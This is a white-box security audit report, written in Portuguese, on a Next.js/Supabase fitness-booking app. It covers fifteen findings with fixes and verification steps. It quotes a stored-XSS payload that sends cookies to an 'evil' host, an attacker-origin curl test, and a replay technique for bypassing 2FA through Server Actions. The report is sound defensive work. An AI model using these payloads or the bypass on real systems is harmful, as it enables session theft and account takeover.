# LEAP-FITNESS · Auditoria de Segurança

> White-box review. IDs estáveis (`S-XX`) — runs futuros mantêm IDs e só
> flipam Status / acrescentam novos findings.
> Severidade: Critical / High / Medium / Low / Info.
> Status: OPEN / IN PROGRESS / FIXED / ACCEPTED.
>
> Último run: 2026-06-18 (re-audit white-box + S-13 / S-14 / S-15 acrescentados).

## Resumo executivo

Postura geral **boa**. As fronteiras de autorização foram cobertas em
runs anteriores (H-A/H-B/H-C/H-D, C-A/C-B/C-C, S-01..S-12) e a maioria
das Server Actions usam `requireStaff`/`requireOwner` + checks
explícitos de ownership sobre o `trainer_id` vindo do form. RLS está
activo em todas as tabelas sensíveis e os RPCs críticos são
`SECURITY DEFINER` com guards internos (`_is_service_or_admin`,
`_trainer_is_accessible`, ownership por `auth.uid()`) — verificado em
0015/0042 neste run.

Neste run (2026-06-18) o achado material é **S-13 (High)**: o gate de
**2FA estava implementado SÓ no `app/admin/layout.tsx`**. Como as Server
Actions são endpoints POST que NÃO renderizam o layout, uma sessão
**AAL1** (password correcta, sem TOTP — exactamente o cenário que o 2FA
existe para travar) podia invocar **todas** as actions de staff
directamente (apagar cliente, atribuir/remover créditos, cancelar
sessões, conceder/revogar admin). `is_admin()` nas RPCs também devolve
`true` em AAL1, por isso a camada de dados não apanhava o gap. **Fechado
neste run** movendo o gate de 2FA para `lib/authz.ts`
(`requireStaff`/`requireOwner` passam a exigir AAL2-ou-trusted-device
quando o caller tem factor verificado, replicando o layout). Acrescentam-se
ainda dois itens de defesa-em-profundidade, **ambos fechados neste run**:
**S-14 (Low → FIXED)** — `getRequestIp` aceitava `x-forwarded-for` forjável
como fallback (mitigado no Vercel; agora pinado a `x-vercel-forwarded-for`
com fail-closed em prod); e **S-15 (Info → FIXED)** — upload de avatar
validava só o MIME declarado pelo cliente (mitigado por bucket em origem
separada `*.supabase.co` + `nosniff` + allowlist sem SVG; agora também
valida magic-bytes).

A correcção do S-13 não altera o fluxo normal: um staff que fez login e
completou o 2FA está em AAL2 (ou tem cookie trusted-device), por isso
`requireStaff`/`requireOwner` passam sem custo extra (sessões AAL2 ou
sem 2FA nem tocam na BD — `getAalInfo` é local e cached por request).
Só a sessão AAL1-com-2FA-pendente é recusada — idêntico ao que o layout
já fazia, agora também no boundary de dados.

> **Baseline determinístico (2026-06-18):** `next@16.2.9` confirmado
> instalado (`node_modules/next/package.json`) → **S-02 fechado na raiz**.
> `npm audit` não pôde correr neste ambiente (rede do sandbox bloqueada);
> correr na máquina/CI. `tsc --noEmit` não é fiável neste sandbox (o mount
> FUSE faz leituras parciais de ficheiros UTF-8 com acentos/em-dash e
> produz erros-fantasma "unterminated string"/JSX em ficheiros não
> tocados); correr `npm run type-check` na máquina como fonte de verdade.
> O fix do S-13 espelha verbatim o uso já tipado de
> `getAalInfo`+`isDeviceTrusted` em `app/admin/layout.tsx`.

## Findings — Índice

| ID | Severidade | CWE | Título | Exploitability | Status |
|----|-----------|-----|-------|---------------|--------|
| S-01 | High | CWE-639 / CWE-89 | Pesquisa admin `/admin/clientes?q=` sem scope + sem escape de separadores PostgREST → PII leakage cross-trainer e filter injection | Autenticado, trainer | FIXED |
| S-02 | High | CWE-1395 | `next@14.2.33` tem várias CVEs (DoS via Image Optimizer, request smuggling em rewrites, DoS em RSC) | Anónimo, internet | FIXED (upgrade `next@^16.2.9`) |
| S-03 | Medium | CWE-352 | `/api/notifications/read` aceita POST sem Origin check — defense-in-depth | Cross-site (SameSite=Lax mitiga) | FIXED |
| S-04 | Medium | CWE-79 | Loja: `<a href={p.link_url}>` sem validação de scheme em `/app/loja/[categoria]` — `javascript:`/`data:` possíveis | Autenticado, trainer malicioso | FIXED |
| S-05 | Medium | CWE-613 | Cache de claims no middleware (30s) pode servir auth stale após expiração do JWT dentro da janela | Necessita JWT a expirar dentro da janela | ACCEPTED (justificado em-código) |
| S-06 | Low | CWE-639 | `markReadAction`/`deleteNotificationAction` sem filtro explícito `user_id` — RLS protege, mas defense-in-depth | Autenticado | FIXED |
| S-07 | Low | CWE-79 | `enroll-card.tsx::extractSvg` constrói `<img src="${src}">` por template literal — defense-in-depth | Server-controlled (Supabase) | FIXED |
| S-08 | Low | CWE-79 | `email.ts::ratingPrompt` interpola `link` no `href` sem escape de aspas — defense-in-depth | Server-controlled (env) | FIXED |
| S-09 | Info | CWE-770 | `middleware.ts::claimsCache` poda só ao chegar a 500 entradas | Local à instância edge | ACCEPTED |
| S-10 | Medium | CWE-285 / CWE-862 | `app/admin/agenda/actions.ts` — 11 Server Actions sem `requireStaff()` no boundary. Único ficheiro `app/admin/**/actions.ts` sem o guard explícito. Defense-in-depth ausente. | Autenticado (cliente) | FIXED |
| S-11 | Low | CWE-778 | `/api/me/export` (XLSX dos meus dados RGPD) não regista evento no audit log; assimetria com `/api/relatorios/export` | Autenticado (próprio user) | FIXED |
| S-12 | Low | CWE-525 | `/api/slots` devolve `Cache-Control: public, s-maxage=30` mas a rota está fora de `isPublic` no middleware → Vercel Edge cacheia para qualquer origem incluindo unauth (dados não são PII, mas inconsistência de policy) | Anónimo | FIXED |
| S-13 | High | CWE-306 / CWE-862 | Gate de 2FA só no `app/admin/layout.tsx` — Server Actions de staff (apagar cliente, créditos, cancelar sessões, conceder admin) invocáveis em sessão AAL1, contornando o TOTP. `requireStaff`/`requireOwner` e `is_admin()` só checavam role, não AAL. | Autenticado staff em AAL1 (password comprometida, sem 2º factor) | FIXED |
| S-14 | Low | CWE-348 | `getRequestIp` (`lib/rate-limit.ts:141`) aceita `x-forwarded-for`/`x-real-ip` forjáveis como fallback → rotação da chave de rate-limit / bypass de brute-force se `x-vercel-forwarded-for` faltar | Anónimo (só fora do Vercel) | FIXED |
| S-15 | Info | CWE-434 | Upload de avatar (`app/admin/definicoes/actions.ts:303-315`) valida só o `file.type` declarado pelo cliente, sem magic-bytes | Autenticado staff (próprio trainer) | FIXED |

## Controlos JÁ em vigor (não voltam a ser flagged)

Lista do que está **bem feito** para evitar re-flag em runs futuros.

- **JWT verificado, não só descodificado**. Middleware (`lib/supabase/middleware.ts:121`)
  e Server Components (`lib/supabase/server.ts:60-64 getClaimsUser`) usam
  `supabase.auth.getClaims()` — verificação ES256 LOCAL contra JWKS, não um
  simples decode. `getSessionUser()` (que só lê cookie) está documentado como
  trade-off PERF onde a chamada upstream já validou.
- **Authz boundary explícita em Server Actions críticas**. `lib/authz.ts`
  exporta `requireStaff`/`requireOwner` que são chamados ao topo de TODAS
  as actions admin (após o fix S-10, agora também em `app/admin/agenda/actions.ts`).
  Acções destrutivas (apagar/banir cliente, cancelar pagamento confirmado)
  exigem `requireOwner` (least privilege).
- **Multi-trainer scope** em RPCs e helpers: `getAccessibleTrainerIds`,
  `getClientIdsInScope`, e `_trainer_is_accessible(trainer_id)` em RLS
  policies. `searchClientsAction` (C-A audit) e a pesquisa em
  `/admin/clientes?q=` (S-01 audit) filtram por scope.
- **RLS activo em todas as tabelas** (84 migrations) com policies por papel
  (`supabase/migrations/0003_rls_policies.sql` + hardening em 0015, 0027,
  0028, 0029, 0030, 0049, 0078, 0081).
- **CSP nonce-based** (`lib/security-headers.ts`) com `'strict-dynamic'`,
  `frame-ancestors 'none'`, `form-action 'self'`, `upgrade-insecure-requests`.
  HSTS 2 anos + preload, X-Frame-Options DENY, X-Content-Type-Options nosniff,
  Referrer-Policy strict-origin-when-cross-origin, COOP same-origin,
  Permissions-Policy fechada (`next.config.mjs:64-104`).
- **Anti-enumeração** em `/registar` e `/recuperar` (sempre redirect "sucesso"
  independentemente do email existir — H-B audit, `app/registar/actions.ts:51-61`).
- **Open-redirect**: `isSafePath`/`safePathOr` aplicados em `/auth/callback`,
  `/login`, `/login/2fa`, `/app/perfil/seguranca` (whitelist `safeReturn`).
- **Rate-limit** Upstash com fallback in-memory; aplicado a `/login`,
  `/registar`, `/recuperar`, `/auth/reset`, `/api/slots`, `/api/bookings/*/ics`,
  `/api/notifications/read`, exports (`/api/me/export`, `/api/relatorios/export`),
  webhooks, e `/api/calendar/feed/[token]` (H-D).
- **Constant-time secret comparison** (`lib/secrets.ts::verifyBearer`) usado
  em todos os crons + push dispatch.
- **OAuth state**: `/api/integrations/[provider]/connect` gera nonce 256-bit,
  guarda `userId:provider:nonce` em cookie HttpOnly, valida com `timingSafeEqual`
  no `/callback` e exige `user.id === storedUserId`.
- **CSRF em disconnect e notifications**: `/api/integrations/[provider]/disconnect`
  e `/api/notifications/read` (S-03) validam `Origin === host`.
- **JSON-LD safe** em `/t/[slug]` — `jsonLdSafe` escapa `<>&  ` para
  prevenir breakout de `</script>` (C1 audit).
- **MFA re-auth ("sudo")**: enroll do primeiro factor exige re-confirmar
  password; unenroll exige challenge TOTP fresco — não basta cookie/trusted
  device (H-A audit, `app/app/perfil/seguranca/actions.ts`).
- **2FA enforced NO BOUNDARY de dados** (S-13, este run): `requireStaff`/
  `requireOwner` (`lib/authz.ts`) exigem AAL2-ou-trusted-device quando o
  caller tem factor verificado — não só o `app/admin/layout.tsx`. O gate
  deixa de depender de o atacante "passar pelo layout".
- **Auth boundary verificada server-side, não só descodificada** (RPCs):
  `0015_security_harden_rpcs.sql` usa `_is_service_or_admin()` (que exige
  `is_admin()` ou service-role) e `0042` valida `client_id = auth.uid()` ou
  `is_admin() AND _trainer_is_accessible(...)` ANTES de qualquer mutação —
  IDOR de reschedule/cancel/confirm/no-show fechado na BD (re-verificado).
- **Service role** confinado a 3 ficheiros (`lib/supabase/server.ts`,
  `app/admin/clientes/[id]/actions.ts`, `app/app/perfil/actions.ts`) — todos
  em código server-only, sempre após `requireOwner`/check explícito de ownership.
- **iCal feed** com UUID v4 estrito + rate-limit dedicado (H-D audit).
- **PII export** com janela limitada a 366 dias, rate-limit `export`, fail-closed
  no audit-log, defesa contra CSV injection (`esc()` neutraliza `=+-@` no
  primeiro carácter).
- **GDPR / direito ao apagamento** via `anonymize_my_account` /
  `anonymize_client_account` + ban subsequente do auth user via service role.
- **Password policy**: mínimo 8 chars no signup/reset/change.
- **Avatar/file uploads**: validação server-side de mime + size (2 MB avatars,
  5 MB store/slideshow), nomes derivados do mime (não do filename original).
  Bucket Supabase aplica `allowed_mime_types` server-side (camada extra).
- **Trainer bio + nome** com strip de `<>` (defense-in-depth contra JSON-LD).
- **Anti-enumeração no register**: trainer_id do form é validado com
  `UUID_RE` e existência+`active=true` antes de propagar a user_metadata.
- **`type-check` bloqueia o build** (`next.config.mjs`): `ignoreBuildErrors`
  voltou a `false` em jun/2026 — actions sem o guard `requireStaff/Owner`
  e retornos mal tipados deixam de passar CI.

## Findings — Detalhe

### S-01 · Pesquisa admin sem scope + filter injection PostgREST `or()` `[High → FIXED]`

**Ficheiro/linhas:** `app/admin/clientes/page.tsx:93-121`

**Vulnerabilidade (original):** Quando o admin pesquisa via `?q=…`, a
página construía a query Supabase como:

```ts
const safe = q.replace(/[%_]/g, (m) => `\\${m}`);
supabase.from("profiles")
  .select("id, full_name, email, phone", { count: "exact" })
  .eq("role", "client")
  .or(`full_name.ilike.%${safe}%,email.ilike.%${safe}%,phone.ilike.%${safe}%`)
  ...
```

Dois problemas:

1. **PII leakage cross-trainer.** Sem filtro de scope, num estúdio
   multi-trainer um trainer (que é `is_admin()`) recebia clientes de
   outro trainer no mesmo `profiles select` policy. Iterando `?q=a..z`,
   enumeração completa nome+email+telefone.
2. **Filter injection na sintaxe `.or()` do PostgREST.** O escape só
   tratava `%_` (wildcards ILIKE) e não os separadores `,()` da
   gramática `or()`.

**Fix aplicado:** restringir aos clientes do scope via
`getClientIdsInScope`; escapar `[%_,()]` em vez de só `[%_]`. Diff visível
no ficheiro indicado.

**Verificação:** num estúdio com ≥2 trainers, login como trainer A e
abrir `/admin/clientes?q=<letra>`. Confirmar que SÓ aparecem clientes do
trainer A (mesma lista que aparece em `tab=todos`). Tentar `?q=foo)` e
confirmar que devolve resultados normais (o `)` foi escapado).

---

### S-02 · Vulnerabilidades CVE no `next@14.2.33` `[High → FIXED]`

**Ficheiro/linhas:** `package.json:20`

**Vulnerabilidade (original):** `npm audit` em 14.2.33 reportava
GHSA-9g9p-9gw9-jx7f (DoS Image Optimizer), GHSA-h25m-26qc-wcjf (DoS
deserialização RSC), GHSA-ggv3-7p47-pfv8 (request smuggling em
rewrites), GHSA-3x4c-7xq6-9pq8 (disk cache `next/image`),
GHSA-q4gf-8mx6-v5v3 e GHSA-8h8q-6873-q5fj (DoS Server Components). Todas
DoS — sem leak de dados / RCE / escalada de privilégios.

**Status (2026-06-17, este run):** **FIXED na raiz**. `package.json`
está em `next@^16.2.9` + `react@^19.2.7`. As CVEs acima são todas em
linhas Next 14 (≤15.x para algumas), corrigidas antes de 16.x. A
mitigação edge anteriormente listada (Upstash + Vercel WAF) deixa de ser
contingência e passa a defesa em profundidade.

**Como verificar:**
```bash
npx next --version   # 16.x
npm audit            # zero advisories críticos relacionados com next
```

**Nota operacional:** com Next 16, `cookies()`/`headers()` passaram a
ser síncronos onde antes podiam ser async. O codemod
`@next/codemod next-async-request-api` foi corrido em jun/2026 — a árvore
de código actual está coerente. Em PRs futuros, evitar voltar a usar a
forma async/await sobre `cookies()`/`headers()`.

---

### S-03 · Falta Origin check em `/api/notifications/read` `[Medium → FIXED]`

**Ficheiro/linhas:** `app/api/notifications/read/route.ts:25-37`

Endpoint POST com cookie de sessão. SameSite=Lax já mitiga, mas
faltava a verificação explícita `Origin === host` que já existe em
`/api/integrations/[provider]/disconnect`. Defense-in-depth trivial.

**Fix aplicado:** validação `new URL(origin).host === host` antes de
tocar na BD; rejeita 403 em mismatch.

**Verificação:** `curl -X POST <app>/api/notifications/read -H 'Origin: https://evil.com' -H 'Cookie: sb-...'` → 403.

---

### S-04 · Loja: `<a href={p.link_url}>` aceita `javascript:`/`data:` `[Medium → FIXED]`

**Ficheiro/linhas:** `app/app/loja/[categoria]/page.tsx:18-21,57-95`,
`app/admin/loja/actions.ts:35-46,101-106,170-174`

React não bloqueia `javascript:` / `data:` em `<a href>`. Sem validação
no Server Action, staff/trainer malicioso (ou conta admin comprometida)
podia gravar `link_url=javascript:fetch('//evil/'+document.cookie)` num
produto da loja → executa no contexto de qualquer cliente que clique.

**Fix aplicado:** `safeHttpUrl()` igual ao já usado em promo banners +
guard `safeHref()` na page para proteger dados antigos.

**Verificação:** admin → Loja → criar produto com
`link_url=javascript:alert(1)` → action devolve "Link inválido". Em BD
seedada com `javascript:` (manual), página renderiza card sem `<a>`.

---

### S-05 · Claims cache do middleware pode servir auth stale (30s) `[Medium → ACCEPTED]`

**Ficheiro/linhas:** `lib/supabase/middleware.ts:18-21, 113-131`

Cache TTL 30s por fingerprint do cookie. Se o cookie não rodar mas o
JWT expirar dentro da janela, o valor cached é servido até 30s além de
expirar. Endpoints sensíveis (MFA) usam `getAuthUser` (round-trip ao
GoTrue) → não afectados. Re-flag se a app passar a suportar revogação
instantânea como requisito.

---

### S-06 · `markReadAction`/`deleteNotificationAction` sem filtro `user_id` `[Low → FIXED]`

**Ficheiro/linhas:** `app/app/notificacoes/actions.ts:8-22`, `:24-45`

RLS protege hoje, mas o filtro `.eq("user_id", user.id)` explícito
elimina o risco de despromoção da policy numa migration futura.

**Verificação:** unit test (manual) — em local com RLS desligado, tentar
`markReadAction("<id-de-outro-user>")` → nada acontece.

---

### S-07 · `extractSvg` constrói `<img src="${src}">` por template literal `[Low → FIXED]`

**Ficheiro/linhas:** `app/app/perfil/seguranca/enroll-card.tsx:99-111,167-188`

O fallback de `<img src=...>` deixou de usar template literal —
renderizado por React (escape nativo de atributos). O caminho quente
(`startsWith("<svg")`) mantém-se inalterado.

---

### S-08 · `email.ts::ratingPrompt` interpola `link` no `href` sem escape `[Low → FIXED]`

**Ficheiro/linhas:** `lib/email.ts:209-227`

`href="${escapeHtml(link)}"` em vez de `href="${link}"`. Defense-in-depth
contra `appUrl` mal configurada (`"` no URL parte o atributo).

---

### S-09 · Cache do middleware sem cap proactivo `[Info → ACCEPTED]`

`pruneClaimsCache` só corre quando `Map.size > 500`. Cada entrada é
leve (string + objecto pequeno), TTL 30s, V8 isolate do Edge é cíclico.

---

### S-10 · Server Actions de agenda sem `requireStaff()` no boundary `[Medium → FIXED]`

**Ficheiro/linhas:** `app/admin/agenda/actions.ts:60-72, 80-121, 123-134,
138-156, 158-183, 185-213, 226-406, 414-472, 474-518, 533-639, 644-675,
678-714, 724-766, 769-784`

**Vulnerabilidade:** Server Actions em `app/admin/**/actions.ts` seguem
o padrão de defense-in-depth definido em `lib/authz.ts`: chamar
`requireStaff()` (ou `requireOwner()`) ao topo da função, antes de
qualquer RPC ou query. O grep confirma — 8 dos 9 ficheiros de actions
admin têm o import:

```
app/admin/loja/actions.ts        ✓
app/admin/equipa/actions.ts      ✓
app/admin/pagamentos/actions.ts  ✓
app/admin/packs/actions.ts       ✓
app/admin/promocoes/actions.ts   ✓
app/admin/clientes/search-action.ts ✓
app/admin/definicoes/actions.ts  ✓
app/admin/clientes/[id]/actions.ts  ✓
app/admin/agenda/actions.ts      ✗  ← o único sem guard
```

As 11 actions exportadas de `agenda/actions.ts` (confirmAttendance,
updateBookingDuration, markNoShow, revertNoShow, cancelAdmin,
deleteBlock, createAgendaBooking, rescheduleBookingAdmin,
addBlockQuick, createBusy, deleteRecurringBlock, updateBlock,
updateRecurringBlock, skipRecurringDate) confiavam EXCLUSIVAMENTE em:

1. RPC `SECURITY DEFINER` para os caminhos que chamam Postgres
   (confirm_booking_attendance, mark_no_show, cancel_booking, …),
2. `getAccessibleTrainerIds()` retornar `[]` para clientes (alguns
   handlers usam isto para validar `trainerId` do form),
3. RLS para os `INSERT/UPDATE/DELETE` directos em `trainer_blocked_times`,
   `trainer_recurring_blocks`, etc.

Hoje, isto bloqueia o ataque — RLS rejeita, RPCs definidas em
`0015_security_harden_rpcs.sql` e seguintes verificam staff. Mas o
contrato do `lib/authz` é "guard explícito no boundary, antes de
qualquer side-effect". O gap quebrava esse contrato e arriscava
escalada silenciosa se um único RPC perdesse o guard interno numa
migration futura.

**Ataque hipotético:** assume-se que a migration X relaxa o guard staff
em `cancel_booking` por erro de copy-paste (ex.: copia da versão de
`cancel_booking_self`). Um cliente autenticado faria invoke da
Server Action `cancelAdminAction` com qualquer `bookingId` do estúdio.
Sem `requireStaff()` no boundary, a chamada chega à RPC; com a policy
relaxada, a RPC executa. Result: cliente cancela sessões alheias.

**Impacto residual hoje:** Nenhum (RPCs ainda bloqueiam). Defense-in-
depth para evitar regressões.

**Fix aplicado neste run (2026-06-17):**
- Adicionado `import { requireStaff } from "@/lib/authz";`
- Adicionada chamada `await requireStaff();` no topo de TODAS as 11
  actions do ficheiro. `requireStaff` é cached por request (lê o
  `profile` via `getCurrentProfile` que é `cache()`-wrapped), por isso
  o custo é uma única leitura por request mesmo em fluxos que invocam
  várias actions em sequência (raro).

**Verificação:**
- `grep -n "requireStaff" app/admin/agenda/actions.ts` → 11 ocorrências
  + 1 import.
- Manual: login como cliente, executar `curl` ao endpoint Server Action
  encoded de `markNoShowAction` com `bookingId=<id-de-um-trainer>` →
  Server Action lança "Acesso restrito." (antes lançava o erro da RPC).
- Build (`npm run type-check`) limpo.

---

### S-11 · `/api/me/export` sem audit-log RGPD `[Low → FIXED]`

**Ficheiro/linhas:** `app/api/me/export/route.ts:114-138`

**Vulnerabilidade:** o ficheiro XLSX devolvido contém PII (nome, email,
telemóvel, histórico de sessões, compras, notas). O equivalente para
trainers (`/api/relatorios/export/route.ts:117-128`) regista
`log_audit_event('export_pii', ...)` e falha closed se o audit falhar.
O `/api/me/export` não — assimetria de auditoria que (a) impede
investigação de incidentes ("quem descarregou os meus dados em X data?")
e (b) é exigência implícita do art. 30 RGPD (registo de tratamentos).

**Impacto:** baixo (o próprio user exporta os SEUS dados → consentimento
implícito), mas mais zero auditoria viola política interna.

**Fix aplicado:** chamada não-bloqueante a `log_audit_event` com action
`export_pii_self`, payload com counts por sheet e formato. Best-effort:
o log falhar não bloqueia o download (já existe consentimento implícito
do user) — só fica trail no console error.

**Verificação:** `curl --cookie ... <app>/api/me/export -o /tmp/me.xlsx`
seguido de `select * from audit_log where action='export_pii_self'
order by created_at desc limit 1;` no Supabase SQL Editor.

---

### S-12 · `/api/slots` declara `Cache-Control: public` em rota autenticada `[Low → FIXED]`

**Ficheiro/linhas:** `app/api/slots/route.ts:43-63`

**Vulnerabilidade:** o middleware redirecciona unauth para `/login`
(rota fora de `isPublic`). Mas a resposta saía com
`Cache-Control: public, s-maxage=30, stale-while-revalidate=300` +
`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge Cache **serve a
resposta cached antes do middleware correr** num cache hit — i.e., uma
chamada unauth ao endpoint cacheado devolveria os slots sem nunca
passar pela auth check.

Os dados em causa não são PII (apenas time-slots livres do trainer X
no dia Y), e a página `/t/<slug>` é pública/SEO-indexável (revela o
trainer). O risco efectivo é **inconsistência arquitectural** (a rota
diz "auth obrigatória" mas o cache contradiz) + revelação trivial de
disponibilidade de um trainer a anónimos. Low/Info.

**Ataque:** atacante anónimo faz `curl <app>/api/slots?trainer=<uuid>&date=2026-06-20&duration=45`
sem cookie, no momento em que esse trio acabou de ser servido a um user
autenticado nos últimos 30s. Recebe a lista de slots → mapeia a agenda
do trainer sem nunca se autenticar.

**Fix aplicado:** trocado `Cache-Control: public` por `private` (browser-
only, sem proxies/CDNs gerais) e mantido o edge cache via
`CDN-Cache-Control: public, s-maxage=30`. Vercel Edge respeita
`CDN-Cache-Control` e mantém a partilha entre clientes legítimos; o
`Cache-Control: private` da resposta impede proxies intermédios
(corporativos, ISPs) de cachear; e o middleware continua a correr antes
do edge cache responder a misses. O ganho PERF do cache mantém-se para
quem está autenticado.

**Verificação:** `curl -i <app>/api/slots?trainer=...&date=...&duration=45`
sem cookie → 307 → `/login`. Resposta autenticada inspeccionada:
`Cache-Control: private, s-maxage=30, ...`, `CDN-Cache-Control: public,
s-maxage=30`.

---

### S-13 · Gate de 2FA só no layout — bypass via Server Action `[High → FIXED]`

**Ficheiro/linhas:** `lib/authz.ts:14-29` (antes do fix), gate original em
`app/admin/layout.tsx:52-56`. Afecta TODAS as Server Actions de staff:
`app/admin/agenda/actions.ts`, `app/admin/clientes/[id]/actions.ts`
(adminDeleteClientAction, setClientBannedAction, grantPackAction,
adjustCreditsAction), `app/admin/equipa/actions.ts` (addTrainer,
grantAdminByEmail, demoteTrainer, makeStudioTrainer…), `app/admin/loja`,
`app/admin/promocoes`, `app/admin/packs`, `app/admin/pagamentos`,
`app/admin/definicoes`.

**Vulnerabilidade:** o desafio de 2FA do staff vivia exclusivamente no
Server Component `app/admin/layout.tsx`:

```ts
const { currentLevel, hasMfa } = await getAalInfo();
if (hasMfa && currentLevel !== "aal2" && !(await isDeviceTrusted(user.id))) {
  redirect(`/login/2fa?next=${...}`);
}
```

`signInWithPassword` estabelece a sessão em **AAL1** ANTES do desafio
TOTP. O layout só corre quando o browser navega para uma página `/admin/*`
e renderiza o layout. Mas as **Server Actions são endpoints POST
independentes** — o Next despacha-as pelo action-id no corpo, sem
renderizar o layout da rota. O guard de dados `requireStaff()`/
`requireOwner()` (e `is_admin()` dentro das RPCs `SECURITY DEFINER`) só
verificava o **role**, nunca o **AAL**. Logo:

- Um atacante com a **password** de um admin (phishing, reuse, leak) mas
  SEM o 2º factor obtém uma sessão AAL1.
- O layout `/admin` redirecciona-o para `/login/2fa` → parece bloqueado.
- Mas ele constrói o POST da Server Action (o payload é serializável e o
  action-id é estável por build) e invoca `adminDeleteClientAction`,
  `grantPackAction`, `cancelAdminAction`, `grantAdminByEmailAction`, etc.
  `requireStaff()` vê `role ∈ {trainer,owner}` → passa. A RPC vê
  `is_admin()` → passa. **O 2FA é completamente contornado** para todas as
  operações destrutivas/financeiras.

**Impacto:** o 2FA — controlo cujo propósito é precisamente proteger
contra password comprometida — não oferece protecção nenhuma às operações
mais sensíveis do painel. Eleva a severidade de qualquer leak de password
de staff a comprometimento total (apagar PII de clientes, falsear
créditos/pagamentos, auto-conceder admin).

**Fix aplicado (2026-06-18):** o gate passou para o boundary de dados em
`lib/authz.ts`. `requireStaff()`/`requireOwner()` chamam agora
`assertMfaSatisfied(profile.id)` depois de validar o role:

```ts
async function assertMfaSatisfied(userId: string): Promise<void> {
  const { currentLevel, hasMfa } = await getAalInfo();
  if (hasMfa && currentLevel !== "aal2" && !(await isDeviceTrusted(userId))) {
    throw new Error("2FA necessária.");
  }
}
```

Replica EXACTAMENTE a condição do layout (mesma política: só staff com
factor verificado é forçado; AAL2 ou trusted-device satisfazem). Custo
nulo no fluxo normal — `getAalInfo` é local (lê o JWT) e cached por
request; só toca na BD (`isDeviceTrusted`) no caso "tem 2FA mas ainda em
AAL1".

**Verificação:**
1. Login como owner com 2FA activo, NÃO completar o desafio (ficar em
   `/login/2fa`). Replicar o POST de uma Server Action
   (ex.: `setClientBannedAction`) com as devnav-tools → resposta lança
   "2FA necessária." (antes executava).
2. Completar o 2FA (AAL2) e repetir → executa normalmente.
3. `grep -n "assertMfaSatisfied" lib/authz.ts` → usado em `requireStaff`
   e `requireOwner`.
4. `npm run type-check` na máquina (o sandbox do audit não consegue —
   ver baseline).

---

### S-14 · `getRequestIp` confia em `x-forwarded-for` forjável `[Low → FIXED]`

**Ficheiro/linhas:** `lib/rate-limit.ts:141-...`

A função tentava `x-vercel-forwarded-for` PRIMEIRO (definido pelo proxy do
Vercel, não forjável pelo cliente) e só depois `x-forwarded-for` /
`x-real-ip` (ambos enviáveis pelo cliente). Em produção no Vercel o
primeiro está sempre presente → não explorável. Fora do Vercel (ou se a
infra mudar), um atacante podia enviar `x-forwarded-for: <aleatório>` por
request e **rodar a chave do rate-limit**, anulando o limite de
brute-force em `/login`/`/registar`.

**Fix aplicado (2026-06-18):** se houver `x-vercel-forwarded-for`, é esse o
IP (idêntico ao anterior — zero mudança em produção, onde está sempre
presente). Em produção SEM esse header (não ocorre no Vercel) deixamos de
confiar nos headers do cliente e devolvemos uma chave fixa
(`"no-trusted-ip"`) → o limiter degrada para um bucket global mais
apertado, **falhando SEGURO** (nunca abre o brute-force). O fallback para
`x-forwarded-for`/`x-real-ip` fica restrito a dev/local.

**Verificação:** em prod, `curl -H 'x-forwarded-for: 1.2.3.4'` repetidamente
sem o header do Vercel → todas as tentativas caem no mesmo bucket (não há
rotação de chave). Em dev local o limiter continua a funcionar via
`x-forwarded-for`.

---

### S-15 · Upload de avatar valida só o MIME declarado `[Info → FIXED]`

**Ficheiro/linhas:** `app/admin/definicoes/actions.ts:303-346`

A validação usava `file.type` (Content-Type declarado pelo browser) +
`file.size`, e derivava a extensão do MIME (não do filename) — bom. Mas não
inspeccionava magic-bytes, por isso um ficheiro com bytes arbitrários e
`type=image/png` era aceite e gravado no bucket `avatars` servido com esse
content-type. Risco já baixo (bucket em **origem separada**
`*.supabase.co`; `X-Content-Type-Options: nosniff` global; allowlist
**exclui SVG**, o único vector real de XSS via imagem).

**Fix aplicado (2026-06-18):** validação da assinatura (magic-bytes) depois
de ler o buffer e antes do upload — aceita só JPEG (`FF D8 FF`), PNG
(`89 50 4E 47 0D 0A 1A 0A`) e WEBP (`RIFF`…`WEBP`). Imagens legítimas
passam sempre, por isso o fluxo normal não muda; conteúdo com type forjado
é rejeitado com "Ficheiro de imagem inválido.".

**Verificação:** upload de um `.txt` renomeado/forjado com
`Content-Type: image/png` → rejeitado. Upload de JPG/PNG/WEBP reais →
funciona como antes.

---

## Ordem de remediação sugerida

1. **S-01 · S-03 · S-04 · S-06 · S-07 · S-08** — FIXED no run anterior.
2. **S-02** — FIXED na raiz (upgrade para Next 16.2.9 + React 19.2.7).
3. **S-10** — FIXED neste run (2026-06-17). `requireStaff()` em todas as
   11 actions de `app/admin/agenda/actions.ts`.
4. **S-11** — FIXED no run anterior. Audit log no `/api/me/export`.
5. **S-12** — FIXED no run anterior. `Cache-Control: private` + `CDN-Cache-Control: public`.
6. **S-13 (High)** — FIXED neste run (2026-06-18). Gate de 2FA movido para
   `lib/authz.ts` (`requireStaff`/`requireOwner`). **Prioridade máxima** —
   re-testar o fluxo AAL1 antes do próximo release.
7. **S-14 (Low)** — FIXED neste run. `getRequestIp` pinado a
   `x-vercel-forwarded-for` (fail-closed em prod sem o header).
8. **S-15 (Info)** — FIXED neste run. Magic-bytes no upload de avatar.
9. **S-05 · S-09** — ACCEPTED, monitor (trade-offs de PERF deliberados;
   alterá-los mudaria comportamento — não tocados).

## Como reproduzir o baseline determinístico

```bash
# Audit de dependências
npm audit --json | tee /tmp/audit.json

# Tipagem (bloqueia o build em CI desde jun/2026)
npx tsc --noEmit

# Greps relevantes
grep -rn "dangerouslySetInnerHTML" app components
grep -rn "SUPABASE_SERVICE_ROLE_KEY" app lib
grep -rn "getSession()\\|getUser()\\|getClaims()" lib app
grep -rn "NEXT_PUBLIC_" app lib
grep -rn "requireStaff\\|requireOwner" app/admin
grep -rn "\\.rpc(" lib app
```
